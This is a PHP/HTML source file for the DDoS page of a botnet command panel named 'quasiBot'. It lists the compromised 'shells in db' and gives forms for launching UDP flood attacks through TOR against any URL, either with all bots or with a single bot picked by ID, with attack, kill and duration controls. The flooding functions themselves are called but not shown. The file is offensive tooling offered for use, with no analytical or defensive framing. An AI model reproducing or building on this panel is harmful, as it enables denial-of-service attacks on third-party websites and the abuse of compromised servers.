<?php

require('../config.php');
auth();

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">


<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
    <title>quasiBot | ddos</title>
    <link href="../style.css" rel="stylesheet" type="text/css" media="screen" />
</head>

<body>
<div id="wrapper">
    <div id="page">
        <div id="page-bgtop">
            <div id="page-bgbtm">
                <div id="content">

                    <div class="post">
                        <h2 class="title"><a href="#">Bots</a></h2>
                        <div class="entry">
                            <p class="meta">
                            Current shells in db
                            <?php
                            showbots();
                            ?>
                            </p>
                        </div>
                    </div>

                    <div class="post">
                        <h2 class="title"><a href="#">DDoS</a></h2>
                        <div class="entry">
                        <p class="meta">
                        Attack with all bots &nbsp;&bull;&nbsp; via TOR &nbsp;&bull;&nbsp; UDP
                        </p>
                        
                        <table>
                        <tr><form method="post">
                        <td><b>URL</b></td><td><b>Action</b></td><td><b>Time</b></td></tr>
                        <tr>
                        <td>
                            <?php
                             echo "<input type=\"text\" style=\"width: 220px;\" value=\"". (empty($_POST['url'])?"website.com":htmlspecialchars($_POST['url'])) ."\" name=\"url\"></td>&nbsp;";
                            ?>
                        <td style="text-align: left;">
                            <input type="radio" name="sup" value="attack"> Attack<br/>
                            <input type="radio" name="sup" value="kill"> Kill<br />
                        </td>
                        <td style="text-align: left;">
                            <?php
                             echo "<input type=\"text\" style=\"width: 50px;\" value=\"". (empty($_POST['time'])?"60":htmlspecialchars($_POST['time'])) ."\" name=\"time\"></td>&nbsp;";
                            ?>
                        </td>
                        <td><input type="submit" value="Go"></td>
                        </form>
                        </tr>
                        </table>  

                        <?php ddos(); ?>

                    </div>
                    </div>
                    <div class="post">
                        <h2 class="title"><a href="#">DoS</a></h2>
                        <div class="entry">
                        <p class="meta">
                        Attack with single bot &nbsp;&bull;&nbsp; via TOR &nbsp;&bull;&nbsp; UDP
                        </p>
                        
                        <table>
                        <tr><form method="post">
                        <td><b>Bot ID</b></td><td><b>URL</b></td><td><b>Action</b></td><td><b>Time</b></td></tr>
                        <tr>
                        <td>
                            <?php
                             echo "<input type=\"text\" style=\"width: 50px;\" value=\"". (empty($_POST['botid1'])?"0":htmlspecialchars($_POST['botid1'])) ."\" name=\"botid1\"></td>&nbsp;";
                            ?>         
                        </td>
                        <td>
                            <?php
                             echo "<input type=\"text\" style=\"width: 220px;\" value=\"". (empty($_POST['url1'])?"website.com":htmlspecialchars($_POST['url1'])) ."\" name=\"url1\"></td>&nbsp;";
                            ?>
                        <td style="text-align: left;">
                            <input type="radio" name="sup" value="attack"> Attack<br/>
                            <input type="radio" name="sup" value="kill"> Kill<br />
                        </td>
                        <td style="text-align: left;">
                            <?php
                             echo "<input type=\"text\" style=\"width: 50px;\" value=\"". (empty($_POST['time1'])?"60":htmlspecialchars($_POST['time1'])) ."\" name=\"time1\"></td>&nbsp;";
                            ?>
                        </td>
                        <td><input type="submit" value="Go"></td>
                        </form>
                        </tr>
                        </table>  

                        <?php dos(); ?>

                    </div>
                    </div>
                    <div style="clear: both;">&nbsp;</div>
                </div>
                <div style="clear: both;">&nbsp;</div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
